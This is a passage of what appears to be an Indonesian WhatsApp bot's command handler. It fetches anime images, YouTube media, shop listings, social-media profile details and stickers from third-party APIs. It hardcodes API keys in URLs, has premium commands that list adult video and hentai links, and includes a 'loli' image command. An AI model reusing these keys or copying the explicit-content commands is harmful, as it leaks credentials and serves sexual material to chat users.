              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

         break

       case 'nekopoisearch':

              if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)

              query = args.join(" ")

              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=IkyChan&query=${query}`)

              get_result = get_result.result

              ini_txt = ""

              for (var x of get_result) {

              ini_txt += `\`\`\`🐥 Title : ${x.title}\`\`\`\n`

              ini_txt += `\`\`\`🐥 Link : ${x.link}\`\`\`\n`

              ini_txt += `\`\`\`🐥 Thumbnail : ${x.thumbnail}\`\`\`\n\n`

}

              reply(ini_txt)

              break

       case 'neko':

       case 'kanna':

       case 'sagiri':

       case 'megumin':

       case 'wallnime':

              reply(mess.wait)

              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=IkyChan`)

              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,

              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

    

              break

       

       

    

              break

       case 'nakanoitsuki':

       case 'nakanoikyy':

       case 'nakanomiku':

              reply(mess.wait)

              res = await axios.get(`https://fdciabdul.tech/api/pinterest?keyword=${command}`)

              var string = JSON.parse(JSON.stringify(res.data))

              var random =  string[Math.floor(Math.random() * string.length)]

              sendFileFromUrl(random, image, {quoted: freply, thumbnail: Buffer.alloc(0), caption: `*Wangy²*`})

              break

       case 'storyanime':

              

              reply(mess.wait)

              anu = await fetchJson(`http://Api.lolhuman.xyz/api/storynime?apikey=IkyChan`)

              buffer = await getBuffer(anu.result)

              wann.sendMessage(from, buffer, video, { quoted: freply })

              break

       case 'nekopoi3d':

       case '3dnekopoi':

       case '3dnekopoilast':

       if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})

              reply(mess.wait)

              try {

              bsangee = await axios.get(`https://api.vhtewan.com/neko3d&apikey=${setting.vhtearkey}`)

              bsangee2 = bsangee.data

              keluarplay = `*List update 3D JAV*\n`

              for (let i = 0; i < bsangee2.result.length; i++) {

              keluarplay += `\n═════════════════\n\n*Judul* : ${bsangee2.result[i].title}\n*Deskripsi* : ${bsangee2.result[i].description}\n*Link* : ${bsangee2.result[i].url}\n`

}

              reply(keluarplay) 

              } catch (err) {

              console.log(err)

              reply('error!')

}

               break

        case 'nekopoijav':

        case 'javnekopoi':

        if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})

               reply(mess.wait)

               try {

               bsangce = await axios.get(`https://api.vhtewan.com/nekojavlist&apikey=${setting.vhtearkey}`)

               bsangce2 = bsangce.data

               keluarplay = `*List update JAV*\n`

               for (let i = 0; i < bsangce2.result.length; i++) {

               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangce2.result[i].title}\n*Serial JAV* : ${bsangce2.result[i].seri}\n*Link* : ${bsangce2.result[i].url}\n`

}

               reply(keluarplay)

               } catch (err) {

               console.log(err)

}

               break

        case 'nekopoicosplay':

        case 'cosplaynekopoi':

        if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})

               try {

               reply(mess.wait)

               bsangbe = await axios.get(`https://api.vhtewan.com/nekojavcosplay&apikey=${setting.vhtearkey}`)

               bsangbe2 = bsangbe.data

               keluarplay = `*List update Cosplay JAV*\n`

               for (let i = 0; i < bsangbe2.result.length; i++) {

               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangbe2.result[i].title}\n*Deskripsi* : ${bsangbe2.result[i].detail}\n*Link* : ${bsangbe2.result[i].url}\n`

}

               reply(keluarplay)

               } catch (err) {

               console.log(err)

}

               break

        case 'otakuongoing':              

               o = await onGoing()

               console.log(o)

               ot = '*「 Ongoing Otakudesu 」*'

               for (let i = 0; i < o.length; i++) {

               ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`

}

               buff = await getBuffer(o[0].thumb)

              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,

              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

    

         

    

break

       

       case 'loli':

       case 'husbu':

       case 'milf':

       case 'cosplay':

       case 'wallml':

              /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://ikyy-chan02.github.io`)

              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data

              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]

              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))

		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]

              imageMsg = ( await wann.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage

              buttonsMessage = {footerText:'follow @bnyk_pnderr', imageMessage: imageMsg,

              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

              fs.unlinkSync(`./${sender}.jpeg`)

              break

        case 'playy':

case 'lagu':

if (args.length < 1) return reply('Apa Yang Mau Dicari?')

teks = args.join(' ')

reply(mess.wait)

if (!teks.endsWith("-doc")){

res = await yts(`${teks}`).catch(e => {

reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')

})

reply(` Playing ${res.all[0].title}`)

let thumbInfo = ` *Youtube Search*

 *🐥 Judul :* ${res.all[0].title}

 *🐣 ID Video :* ${res.all[0].videoId}

 *🐤 Diupload Pada :* ${res.all[0].ago}

 *🐥 Views :* ${res.all[0].views}

 *🐣 Durasi :* ${res.all[0].timestamp}

 *🐤 Channel :* ${res.all[0].author.name}

 *🔗 Link Channel :* ${res.all[0].author.url}

 

*File Sedang Di Kirim........*

`

/////////////sendFileFromUrl(res.all[0].image, image, {quoted: freply, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

reply('_[ ! ] Error Saat Memasuki Web Y2mate_')

})

sendFileFromUrl(res[0].link, audio, {quoted: freply, mimetype: 'audio/mp4', filename: res[0].output})

}

if (teks.endsWith("-doc")){

const tec = teks.split("-doc")

res = await yts(`${tec}`).catch(e => {

reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')

})

reply(`.Playing ${res.all[0].title}`)

let thumbInfo = `*${botName}* 

 *Judul :* ${res.all[0].title}

 *ID Video :* ${res.all[0].videoId}

 *Diupload Pada :* ${res.all[0].ago}

 *Views :* ${res.all[0].views}

 *Durasi :* ${res.all[0].timestamp}

 *Channel :* ${res.all[0].author.name}

*Link Channel :* ${res.all[0].author.url}



*_Tunggu Proses Upload....._*

`

sendFileFromUrl(res.all[0].image, image, {quoted: freply, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

reply('_[ ! ] Error Saat Memasuki Web Y2mate_')

})

sendFileFromUrl(res[0].link, document, {quoted: freply, mimetype: 'audio/mp3', filename: res[0].output})

}

break

case 'play2':   

				  if (args.length < 1) return reply('*Masukan judul nya?*')

reply('Loading.... ')

				play = args.join(" ")

				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=apivinz`)

				if (anu.error) return reply(anu.error)

				infomp3 = `*「 PLAY VIDEO 」*

				

Judul : ${anu.result.title}

Source : ${anu.result.source}

				

*[Wait] Tunggu Sebentwan..*`

				///////buffer = await getBuffer(anu.result.thumbnail)

				buffer1 = await getBuffer(anu.result.url_video)

				wann.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Nih Gan'})

					break  

					

					case 'ytdl':

					case 'play':

			  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://ikyy-chan02.github.io`)

              if (!q) return reply('Linknya?')

			 res = await yts(q)

			   let thumbInfo = ` 

*Youtube Download*

 *🐥 Judul :* ${res.all[0].title}

 *🐣 ID Video :* ${res.all[0].videoId}

 *🐤 Diupload Pada :* ${res.all[0].ago}

 *🐥 Views :* ${res.all[0].views}

 *🐣 Durasi :* ${res.all[0].timestamp}

 *🐤 Channel :* ${res.all[0].author.name}

 *🔗 Link Channel :* ${res.all[0].author.url}



*Silahkan pilih media yang akan di download*

`

buttons = [{buttonId:`${prefix}play2 ${q}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`${prefix}playy ${q}`,buttonText:{displayText:'🎵AUDIO'},type:1}]



imageMessage = (await wann.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage



buttonsMessage = {contentText: thumbInfo,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}



prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{})



wann.relayWAMessage(prep)

break





  case 'lirik':



  if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)



 query = args.join(" ")



  get_result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=IkyChan&query=${query}`)



  reply(get_result.result)







  break



  case 'pinterest':



  if (args.length == 0) return reply(`Example: ${prefix + command} loli`)



 query = args.join(" ")



  reply (mess.wait)



  ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=IkyChan&query=${query}`)



  ini_url = ini_url.result



  buff = await getBuffer(ini_url)



  buttons = [{buttonId: `${prefix + command} ${query}`,buttonText:{displayText: `➡️Next`},type:1}]



  imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



  buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



  contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}



  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



  wann.relayWAMessage(prep)



  break



  case 'shopee':



  try {



if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)



  query = args.join(" ")



reply(mess.wait)



get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${setting.zekskey}&q=${query}`)



get_data = get_data.data



teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



┆ *SHOPEE* 



└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







*Data Berhasil Didapatkan!*\n`



for(let i = 0; i < get_data.length; i++) {



 teks += `\`\`\`🐥 Nama : ${get_data[i].name}\`\`\`



 \`\`\`🐥 Harga : ${get_data[i].harga}\`\`\`



 \`\`\`🐥 Terjual : ${get_data[i].terjual}\`\`\`



 \`\`\`🐥 Lokasi : ${get_data[i].location}\`\`\`



 \`\`\`🐥 Deskripsi*: ${get_data[i].desc}\`\`\`



 \`\`\`?? Stok : ${get_data[i].stock}\`\`\`



 \`\`\`🐥 Informasi : ${get_data[i].information}\`\`\`



 \`\`\`🐥 Link : ${get_data[i].url}\`\`\``



  }



  ini_buffer = await getBuffer(get_data[0].img_detail[0])



  wann.sendMessage(from, ini_buffer, image, { quoted: freply, caption: teks })



} catch {



  reply(`Maaf produk ${query} tidak ditemukan`)



}



break



case 'playstore':



try {



  if (args.length == 0) return reply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)



 query = args.join(" ")



  reply(mess.wait)



  get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${setting.zekskey}&q=${query}`)



  get_result = get_result.result



  teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



  ┆ *PLAYSTORE*



  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







  *Data Berhasil Didapatkan!*\n`



  for(let i = 0; i < get_result.length; i++) {



 teks += `\`\`\`🐥 Title : ${get_result[i].title}\`\`\`



 \`\`\`🐥 Harga : ${get_result[i].price}\`\`\`



 \`\`\`🐥 Rate : ${get_result[i].rating}\`\`\`



 \`\`\`🐥 Link : ${get_result[i].url}\`\`\`







 `



  }



  ini_buffer = await getBuffer(get_result[0].thumb)



  wann.sendMessage(from, ini_buffer, image, { quoted: freply, caption: teks })



} catch {



  reply(`Maaf aplikasi ${query} tidak ditemukan`)



}



break



case 'yts':



case 'ytsearch':



if (!q) return reply(mess.wrongFormat)



  reply(mess.wait)



try {



  res = await yts(q)



  a = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



  ┆ *YOUTUBE SEARCH*



  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







  *Data Berhasil Didapatkan!*\n`



  for (let i of res.all) {



 a += `\`\`\`🐣 Title : ${i.title}\`\`\`



 \`\`\`🐤 Views : ${i.views}\`\`\`



 \`\`\`🐣 Upload : ${i.ago}\`\`\`



 \`\`\`🐥 Durasi : ${i.timestamp}\`\`\`



 \`\`\`🐤 Channel : ${i.author.name}\`\`\`



 \`\`\`🔗 Link : ${i.url}\`\`\``



  }



  b = a.trim()



  sendFileFromUrl(res.all[0].image, image, {quoted: freply, caption: b})



} catch (e) {



 console.log(e)



 reply(`${e}`)



  }



  break



  case 'tourl':



  if ((isMedia && !wan.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {



 reply(mess.wait)



 boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



 owgi = await wann.downloadMediaMessage(boij)



 res = await uploadImages(owgi)



 reply(res)



  } else {



 reply('kirim/reply gambar/video')



  }



  break







  case 'imgtourl':



  case 'img2url':



  reply(mess.wait) 



  var imgbb = require('imgbb-uploader')



  var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



  var media = await  wann.downloadAndSaveMediaMessage(encmedia) 



  imgbb('67bb63bdcb5c234b7aba60c618a2b903', media)



  .then(data => {



 var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`



 ibb = fs.readFileSync(media)



 wann.sendMessage(from, ibb, image, { quoted: freply, caption: caps})



  })



  .catch(err => {



 throw err



  })



  break



case 'asupan': // shansekai



if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})



  reply(mess.wait)



asupan()



.then(async (body) => {



  asupann = body.split('\n')



  asupanx = asupann[Math.floor(Math.random() * asupann.length)]



  sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, 'Follow IG: https://www.instagram.com/ptl_repost untuk mendapatkan asupan lebih banyak.')



  console.log('Success sending video!')



})



.catch(async (err) => {



  console.log(err)



  reply(`${err}`)



})



break

case 'public':

		              if (!isOwner) return reply(lang.onlyOwner())

		          	if (banChats === true) return

		          	banChats = true

		          	//fakeitem(`「 *PUBLIC-MODE* 」`)

						sendButMessage(from, `「 *PUBLIC-MODE* 」`, `Click self to return to self mode`, [

            {

              buttonId: noprefix ? "self" : "!"+"self",

              buttonText: {

                displayText: `SELF MODE`,

              },

              type: 1,

            }]);

        break;

			case 'self':

			          if (!isOwner) return reply(lang.onlyOwner())

		          	if (banChats === false) return

		          	banChats = false

		          	//fakeitem(`「 *SELF-MODE* 」`)

		          	sendButMessage(from, `「 *SELF-MODE* 」`, `Click public to return to public mode`, [

            {

              buttonId: noprefix ? "public" : "!"+"public",

              buttonText: {

                displayText: `PUBLIC MODE`,

              },

              type: 1,

            }]);

        break;



case 'nulis':



case 'tulis':



if (args.length < 1) return reply('Yang mau di tulis apaan?')



  teks = args.join(' ')



reply(mess.wait)



nulis = encodeURIComponent(teks)



res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)



if (res.data.error) return reply(res.data.error)



  buff = Buffer.from(res.data.result.split(',')[1], 'base64')



wann.sendMessage(from, buff, image, {quoted: freply, caption: mess.success}).catch(e => {



  return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')



})



break



//------------------< Level >-------------------



case 'level': 



if (!isGroup) return reply(mess.only.group)



  if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')



 let userLevel = level.getLevelingLevel(sender, _level)



  let userXp = level.getLevelingXp(sender, _level)



  let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100



  let userRank = level.getUserRank(sender, _level)



  try {



 profilePic = await wann.getProfilePicture(sender)



  } catch {



 profilePic = errorImg



  }



  buffer = await getBuffer(`http://Api.lolhuman.xyz/api/rank?apikey=IkyChan&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)



  teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`



  buttons = [{ buttonId: `${prefix}mining`, buttonText: { displayText: 'MINING' }, type: 1 },{ buttonId: `${prefix}leaderboard`, buttonText: { displayText: 'LEADEBOARD' },type:1}]



  imageMsg = (await wann.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage



  buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



  contentText:`${teks}`,buttons,headerType:4}



  prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



  wann.relayWAMessage(prep)



  break



 case 'leaderboard': //Cek Leaderboard



 case 'leaderboards':



 if (!isGroup) return reply(mess.only.group)



  if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!') 



 const resp = _level



  _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)



  let leaderboard =  '-----[ *LEADERBOARD* ]----\n\n'



  try {



 for (let i = 0; i < 10; i++) {



var roles = 'Warrior III'



if (resp[i].level <= 5) {



  roles = 'Warrior II'



} else if (resp[i].level <= 10) {



  roles = 'Warrior I'



} else if (resp[i].level <= 15) {



  roles = 'Elite III'



} else if (resp[i].level <= 20) {



  roles = 'Elite II'



} else if (resp[i].level <= 25) {



  roles = 'Elite I'



} else if (resp[i].level <= 30) {



  roles = 'Master III'



} else if (resp[i].level <= 35) {



  roles = 'Master II'



} else if (resp[i].level <= 40) {



  roles = 'Master I'



} else if (resp[i].level <= 45) {



  roles = 'GrandMaster III'



} else if (resp[i].level <= 50) {



  roles = 'GrandMaster II'



} else if (resp[i].level <= 55) {



  roles = 'GrandMaster I'



} else if (resp[i].level <= 60) {



  roles = 'Epic III'



} else if (resp[i].level <= 65) {



  roles = 'Epic II'



} else if (resp[i].level <= 70) {



  roles = 'Epic I'



} else if (resp[i].level <= 75) {



  roles = 'Legend III'



} else if (resp[i].level <= 80) {



  roles = 'Legend II'



} else if (resp[i].level <= 85) {



  roles = 'Legend I'



} else if (resp[i].level <= 90) {



  roles = 'Mythic'



} else if (resp[i].level <= 95) {



  roles = 'Mythical Glory'



} else if (resp[i].level >= 100) {



  roles = 'Immortal'



} 







leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role :* ${roles}\n\n`



 }



 reply(leaderboard)



  } catch (err) {



 console.error(err)



 reply('_Perlu setidaknya 10 user yang memiliki level di database!_')



  }



  break
               

//------------------< Stalk >-------------------



case 'stalkgithub':



case 'githubstalk':



if (args.length == 0) return reply(`Example: ${prefix + command} ikyy-chan02`)



  reply(mess.wait)



username = args[0]



ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=IkyChan`)



ini_result = ini_result.result



ini_buffer = await getBuffer(ini_result.avatar)



ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



┆ *GITHUB USER*



└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







*Data Berhasil Didapatkan!*



\`\`\`🐥 Username : ${ini_result.name}\`\`\`



\`\`\`🐥 Public Repo : ${ini_result.public_repos}\`\`\`



\`\`\`🐥 Public Gists : ${ini_result.public_gists}\`\`\`



\`\`\`🐥 Pengikut : ${ini_result.followers}\`\`\`



\`\`\`🐥 Following : ${ini_result.following}\`\`\`



\`\`\`🐥 Mengikuti : ${ini_result.bio}\`\`\`



\`\`\`?? Link : ${ini_result.url}\`\`\`



`



wann.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })



break



case 'stalkig':



case 'igstalk':



if (args.length == 0) return reply(`Example: ${prefix + command} wann.chan26`)



 reply(mess.wait)



username = args[0]



ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=IkyChan`)



ini_result = ini_result.result



ini_buffer = await getBuffer(ini_result.photo_profile)



ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



┆ *INSTAGRAM PROFILE*



└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







*Data Berhasil Didapatkan!*



\`\`\`🐥 Username : ${ini_result.username}\`\`\`



\`\`\`🐥 Nama : ${ini_result.fullname}\`\`\`



\`\`\`🐥 Pengikut : ${ini_result.followers}\`\`\`



\`\`\`🐥 Mengikuti : ${ini_result.following}\`\`\`



\`\`\`🐥 Deskripsi : ${ini_result.bio}\`\`\`



\`\`\`🐥 Link : https://instagram.com/${ini_result.username}\`\`\`



`



wann.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })



break



case 'stalktiktok':



case 'tiktokstalk':



if (args.length == 0) return reply(`Example: ${prefix + command} marz.hiatus`)



 reply(mess.wait)



stalk_toktok = args[0]



get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=IkyChan`)



get_result = get_result.result



pp_tt = await getBuffer(get_result.user_picture)



ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓



┆ *TIKTOK PROFILE*



└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶







*Data Berhasil Didapatkan!*



\`\`\`🐥 Username : ${get_result.username}\`\`\`



\`\`\`🐥 Nama : ${get_result.nickname}\`\`\`



\`\`\`🐥 Pengikut : ${get_result.followers}\`\`\`



\`\`\`🐥 Mengikuti : ${get_result.followings}\`\`\`



\`\`\`?? Likes : ${get_result.likes}\`\`\`



\`\`\`🐥 Video : ${get_result.video}\`\`\`



\`\`\`🐥 Deskripsi : ${get_result.bio}\`\`\`



`



wann.sendMessage(from, pp_tt, image, { quoted: freply, caption: ini_txt, thumbnail: Buffer.alloc(0) })



break



case 'iguser':



try {



  if (args.length == 0) return reply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)



 query = args.join(" ")



  reply(mess.wait)



  get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${setting.zekskey}&q=${query}`)



  get_result = get_result.result



  teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`



  for(let i = 0; i < get_result.length; i++) {



 teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`



  }



  ini_buffer = await getBuffer(get_result[0].profile_pic)



  wann.sendMessage(from, ini_buffer, image, { quoted: freply, caption: teks })



} catch {



  reply(`Maaf username ${query} tidak ditemukan`)



}



break



//------------------< Sticker/Tools >-------------------







  case 'dadu': // by CHIKAA CHANTEKKXXZZ



 reply(mess.wait)



 dadu()



 .then(async (body) => {



  dadugerak = body.split('\n')



  dadugerakx = dadugerak[Math.floor(Math.random() * dadugerak.length)]



  sendWebp(from, dadugerakx)



})



 .catch(async (err) => {



  console.error(err)



  reply('Error!')



})



 break



 case 'doge':



 reply(mess.wait)



 fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')



 .then(res => res.text())



 .then(body => {



  let tod = body.split("\n");



  let pjr = tod[Math.floor(Math.random() * tod.length)];



  sendWebp(from, pjr)



}



)



 break



 case 'linkgc':



 case 'link':



 case 'linkgroup':



 linkgc = await wann.groupInviteCode(from)



 reply('https://chat.whatsapp.com/'+linkgc)



 case 'patrick':



 reply(mess.wait)



 fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')



 .then(res => res.text())



 .then(body => {



  let tod = body.split("\n");



  let pjr = tod[Math.floor(Math.random() * tod.length)];



  sendWebp(from, pjr)



}



)



 break



 case 'gura':



 case 'gawgura':



 reply(mess.wait)



 fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')



 .then(res => res.text())



 .then(body => {



  let tod = body.split("\n");



  let pjr = tod[Math.floor(Math.random() * tod.length)];



  sendWebp(from, pjr)



}



)



 break



        case 'animestick':



       case 'stickeranime':



              reply(mess.wait)



              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')



             .then(res => res.text())



             .then(body => {



              let todd = body.split("\n");



              let pjrr = todd[Math.floor(Math.random() * todd.length)];



              sendWebp(from, pjrr)



}



)



              break
              
case 'jadwalsholat':
                if (args.length == 0) return reply(`_Example: ${prefix}${command} yogyakarta_`)
                var daerah = args.join(" ")
                var result = await getJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=WannOff`)
                result = result.result
                text = `╭───「 Jadwal Sholat 」\n`
                text += `├❏ Wilayah : ${result.wilayah}\n│\n`
                text += `├❏ Tanggal : ${result.tanggal}\n│\n`
                text += `├❏ \`\`\`Sahur   : ${result.sahur}\`\`\`\n`
                text += `├❏ \`\`\`Imsak   : ${result.imsak}\`\`\`\n`
                text += `├❏ \`\`\`Subuh   : ${result.subuh}\`\`\`\n`
                text += `├❏ \`\`\`Dhuha   : ${result.dhuha}\`\`\`\n`
                text += `├❏ \`\`\`Dzuhur  : ${result.dzuhur}\`\`\`\n`
                text += `├❏ \`\`\`Ashar   : ${result.ashar}\`\`\`\n`
                text += `├❏ \`\`\`Maghrib : ${result.maghrib}\`\`\`\n`
                text += `├❏ \`\`\`Isya    : ${result.isya}\`\`\`\n│\n`
                text += `╰───「 WannBotz 」`
                await wan.sendFakeStatus(from, text, result.wilayah.toUpperCase())
                break


 case 'telesticker': 



 case 'telestiker':



 if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)



  reply(mess.wait)



ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=IkyChan&url=${args[0]}`)



ini_sticker = ini_url.result.sticker



reply('Sending '+ ini_sticker.length +' stickers...')



for (sticker_ in ini_sticker) {



  ini_buffer = await getBuffer(ini_sticker[sticker_])



  wann.sendMessage(from, ini_buffer, sticker, {})



}



break



case 'semoji':



case 'emoji':



if (args.length == 0) return reply(`Example: ${prefix + command} ðŸ˜­`)



  emoji = args[0]



try {



  emoji = encodeURI(emoji[0])



} catch { 



  emoji = encodeURI(emoji)



}



ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=IkyChan`)



await wann.sendMessage(from, ini_buffer, sticker, { quoted: freply })



break



case 'semoji2':



case 'emoji2':



if (args.length == 0) return reply(`Example: ${prefix + command} ðŸ˜­`)



  emoji = args[0]



try {



  emoji = encodeURI(emoji[0])



} catch { 



  emoji = encodeURI(emoji)



}



ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji3/${emoji}?apikey=IkyChan`)



await wann.sendMessage(from, ini_buffer, sticker, { quoted: freply })



case 'ttp':



case 'ttp2':



case 'ttp3':



case 'ttp4':







if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)



  ini_txt = args.join(" ")



ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${setting.lolkey}&text=${ini_txt}`)



await wann.sendMessage(from, ini_buffer, sticker, { quoted: freply })



break







case 'stikertahta':



case 'stt': 



if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)



  ajgg = args.join(" ")



reply('wait....')



meki = `https://leyscoders-api.herokuapp.com/api/harta-tahta?text=${encodeURI(q)}&apikey=IkyChan`



sendStickerUrl(from, meki, { quoted: freply})



break







case 'attp':



